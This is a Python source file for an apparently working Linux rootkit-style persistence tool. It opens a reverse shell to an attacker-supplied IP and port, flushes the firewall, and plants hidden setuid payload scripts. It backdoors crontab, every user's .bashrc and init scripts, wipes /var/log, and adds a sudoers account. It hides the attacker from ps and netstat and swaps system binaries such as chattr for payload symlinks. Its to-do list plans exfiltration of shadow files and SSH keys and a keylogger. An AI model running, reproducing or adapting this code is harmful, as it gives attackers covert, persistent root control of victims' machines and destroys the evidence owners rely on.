import os
import sys
import crypt

def get_reverse_payload(ip, port):
	payload = "python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + ip + "\"," + port + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);\' 2> /dev/null"
	return payload

def disable_iptables():
	try:
		os.system("chattr +i /root/.bash_history")
		os.system("iptables -F")
		os.system("/etc/init.d/iptables stop")
		os.system("chkconfig iptables off")
		os.system("chattr -i /root/.bash_history")
	
	except Exception,e:
		print "[!] Unable to disable Iptables..."
		print e

def generate_scripts(payload):
	try:
		os.system("chattr +i /root/.bash_history")
		os.system("touch sysdaemon.sh")
		with open("sysdaemon.sh", "w") as shell:
			shell.write(payload)
		os.system("chmod 4711 sysdaemon.sh")
		os.system("mkdir /root/.sysutil")
		os.system("mv sysdaemon.sh /root/.sysutil/.sysdaemon.sh")
		os.system("chattr +i /root/.sysutil/.sysdaemon.sh")
		os.system("chattr -i /root/.bash_history")
	
	except Exception,e:
		print "[!] Unable to generate reverse scripts..."
		print e
		sys.exit(1)

def add_cronjob(payload):
	try:
		os.system("chattr +i /root/.bash_history")
		
		cronjob = "*/1 * * * * root /root/.sysutil/.sysdaemon.sh 2> /dev/null"
		os.system("echo '"+cronjob+"' >> /etc/crontab")
		
		os.system("chattr +i /etc/crontab")
		os.system("service cron stop")
		os.system("service cron start")
		os.system("chattr -i /root/.bash_history")
	
	except Exception,e:
		print "[!] Unable to backdoor /etc/crontab..."
		print e

def add_bashrc(payload):
	try:
		os.system("chattr +i /root/.bash_history")
		
		bashrc_cmd = "/root/.sysutil/.sysdaemon.sh 2> /dev/null"
		os.system("echo '"+bashrc_cmd+"' >> /root/.bashrc")
		
		with open("/root/.bashrc", "a") as bashfile:
			bashfile.write(payload)
		
		os.system("chattr +i /root/.bashrc")
		os.system("chattr -i /root/.bash_history")
		
		# Infect all users
		users = os.listdir("/home/")
		for user in users:
			os.system("chattr +i /home/"+user+"/.bash_history")
			
			bashrc_cmd = "/root/.sysutil/.sysdaemon.sh 2> /dev/null"
			os.system("echo '"+bashrc_cmd+"' >> /home/"+user+"/.bashrc")
			
			with open("/home/"+user+"/.bashrc", "a") as bashfile:
				bashfile.write(payload)
			
			os.system("chattr +i /home/"+user+"/.bashrc")
			os.system("chattr -i /root/.bash_history")

	except Exception,e:
		print "[!] Unable to backdoor /root/.bashrc..."
		print e

def add_init(payload):
	try:
		os.system("chattr +i /root/.bash_history")
		init_cmd = "/root/.sysutil/.sysdaemon.sh 2> /dev/null"
		
		scripts = os.listdir("/etc/init.d/")
		for script in scripts:
			os.system("echo '"+init_cmd+"' >> /etc/init.d/"+script)
			os.system("chattr +i /etc/init.d/"+script)
			
		os.system("chattr -i /root/.bash_history")
	
	except Exception,e:
		print "[!] Unable to backdoor /etc/init.d/ scripts..."
		print e

def hide_tracks():
	try:
		os.system("rm -rf /var/log/*")
		os.system("chattr +i /var/log")
		
	except Exception,e:
		print "[!] Unable to hide tracks..."
		print e
	
def add_root_user(username, password):
	try:
		os.system("chattr +i /root/.bash_history")
		enc_pass = crypt.crypt(password,"fun")
		os.system("useradd -p "+enc_pass+ " -s "+ "/bin/bash "+ "-d "+ "/home/" + username+ " -m "+ " -c \""+ username+"\" " + username)
		os.system("echo \'"+username+"  ALL=(ALL:ALL) ALL\' >> /etc/sudoers")
		os.system("chattr +i /etc/sudoers")
		os.system("chattr -i /root/.bash_history")
	
	except Exception,e:
		print "[!] Couldn't add sudo user..."
		print e

def hide_from_ps(ip):
	try:
		os.system("chattr +i /root/.bash_history")
		os.system("chattr -i /root/.bashrc")
		os.system("mkdir /bin/.binaries")
		os.system("mv `which ps` /bin/.binaries")

		alias = "\npsfunc() {\n\t/bin/.binaries/ps $1 | grep -ve " + ip + " -ve sysdaemon -ve socket -ve binaries -ve psfunc -ve network -ve netstatfunc -ve sshdaemon -ve maildaemon\n}\nalias ps=psfunc\n"

		with open("/root/.bashrc", "a") as psfile:
			psfile.write(alias)
	
		os.system("chattr +i /root/.bashrc")
	
	except Exception,e:
		print "[!] Couldn't infect root bashrs with ps hide..."
	
	# Infect all users
	users = os.listdir("/home/")
	
	for user in users:
		try:
			os.system("chattr +i /home/"+user+"/.bash_history")
			os.system("chattr -i /home/"+user+"/.bashrc")

			alias = "\npsfunc() {\n\t/bin/.binaries/ps $1 | grep -ve " + ip + " -ve sysdaemon -ve socket -ve binaries -ve psfunc -ve network -ve netstatfunc -ve sshdaemon -ve maildaemon\n}\nalias ps=psfunc\n"

			with open("/home/"+user+"/.bashrc", "a") as psfile:
				psfile.write(alias)
	
			os.system("chattr +i /home/"+user+"/.bashrc")
			os.system("chattr -i /root/.bash_history")
		except Exception,e:
			print "[!] Couldn't infect user with ps hide..."
			pass
	
	os.system("chattr -i /root/.bash_history")

def hid_from_netstat(ip):
	try:
		os.system("chattr +i /root/.bash_history")
		os.system("chattr -i /root/.bashrc")
		os.system("mkdir /bin/.network")
		os.system("mv `which netstat` /bin/.network")
		alias = "\nnetstatfunc() {\n\t/bin/.network/netstat $1 | grep -v " + ip + "\n}\nalias netstat=netstatfunc\n"
		with open("/root/.bashrc", "a") as psfile:
			psfile.write(alias)
	
		os.system("chattr +i /root/.bashrc")
	
	except Exception,e:
		print "[!] Couldn't infect root bashrs with netstat hide..."
	
	# Infect all users
	users = os.listdir("/home/")
	
	for user in users:
		try:
			os.system("chattr +i /home/"+user+"/.bash_history")
			os.system("chattr -i /home/"+user+"/.bashrc")
			alias = "\nnetstatfunc() {\n\t/bin/.network/netstat $1 | grep -v " + ip + "\n}\nalias netstat=netstatfunc\n"
			with open("/home/"+user+"/.bashrc", "a") as psfile:
				psfile.write(alias)
	
			os.system("chattr +i /home/"+user+"/.bashrc")
			os.system("chattr -i /root/.bash_history")
		except Exception,e:
			print "[!] Couldn't infect user with ps hide..."
			pass
	
	os.system("chattr -i /root/.bash_history")
	
def backdoor_binaries(payload):
	os.system("chattr +i /root/.bash_history")
	
	os.system("mkdir /root/.ssh")
	os.system("touch /root/.ssh/.sshdaemon.sh")
	with open("/root/.ssh/.sshdaemon.sh", "w") as sshfile:
		sshfile.write(payload + " 2> /dev/null")
	os.system("chmod 4711 /root/.ssh/.sshdaemon.sh")
	
	os.system("mkdir /root/.mail")
	os.system("touch /root/.mail/.maildaemon.sh")
	with open("/root/.mail/.maildaemon.sh", "w") as sshfile:
		sshfile.write(payload + " 2> /dev/null")
	os.system("chmod 4711 /root/.mail/.maildaemon.sh")
	
	os.system("mkdir /root/.tty0")
	os.system("touch /root/.tty0/.tty0.sh")
	with open("/root/.tty0/.tty0.sh", "w") as sshfile:
		sshfile.write(payload + " 2> /dev/null")
	os.system("chmod 4711 /root/.tty0/.tty0.sh")
	
	os.system("TMP=`which lsattr`; rm $TMP; ln -s /root/.ssh/.sshdaemon.sh $TMP")
	os.system("chattr +i /root/.ssh/.sshdaemon.sh")
	os.system("TMP=`which tcpkill`; rm $TMP; ln -s /root/.tty0/.tty0.sh $TMP")
	os.system("chattr +i /root/.tty0/.tty0.sh")
	
	os.system("chattr -i /root/.bash_history")
	os.system("TMP=`which chattr`; rm $TMP; ln -s /root/.mail/.maildaemon.sh $TMP")
	
def backdoor_all_scripts():
	return 1

def exfiltrate_data():
	'''
	1) bash history for all users
	2) Logs
	3) private ssh keys
	4) /etc/shadow
	3) /etc/passwd
	'''
	return 0

def main():

	attacker_ip = sys.argv[1]
	attacker_port = sys.argv[2]
	
	username = sys.argv[3]
	password = sys.argv[4]
	
	print "Setting up persistence for", attacker_ip, "on port", attacker_port, "...\n"
	
	payload = get_reverse_payload(attacker_ip, attacker_port)
	
	disable_iptables()
	print "[+] Disabled and flushed Iptables"
	
	# Verified working properly
	generate_scripts(payload)
	print "[+] Generated reverse connection script and locked it down"
	
	# Verified working properly
	add_cronjob(payload)
	print "[+] Enabled cronjob persistence"
	
	# Verified working properly
	add_bashrc(payload)
	print "[+] Enabled bashrc persistence"
	
	#add_init(payload)
	print "[+] Enabled init.d persistence"
	
	# Verified Working properly
	hide_tracks()
	print "[+] Logs and history have been sanitized and immuted"
	
	# Verified working properly
	add_root_user(username, password)
	print "[+] Root user has been added"
	
	# Verified working properly
	hide_from_ps(attacker_ip)
	print "[+] Made us hidden from PS command"
	
	# Verified working properly
	hid_from_netstat(attacker_ip)
	print "[+] Made us hidden from Netstat command"
	
	# Verified working properly
	backdoor_binaries(payload)
	print "[+] Binaries have been deleted"
	
	#backdoor_all_scripts()
	#print "[+] Scripts have been backdoord"
	
	#exfiltrate_data()
	#print "[+] Data has been exfiltrated"
	
	print "[+] All tasks completed successfully..."
	sys.exit(0)
	
if __name__ == "__main__":
	main()
	 
'''
To add:
	1)  Script to make sure things are running and havent been deleted, if so add them back :)
	2)  Implement exfiltrate_data()
	3)  Encrypt shell connection and data exfiltration
	4)  Install keylogger
	5)  Upload private key for ssh as root, enable root ssh login
	6)  Change root password
	7)  Add optparser so that its flexible, may not want to delete logs, etc
	8)  Use bash forking free up terminal usage for victim
'''
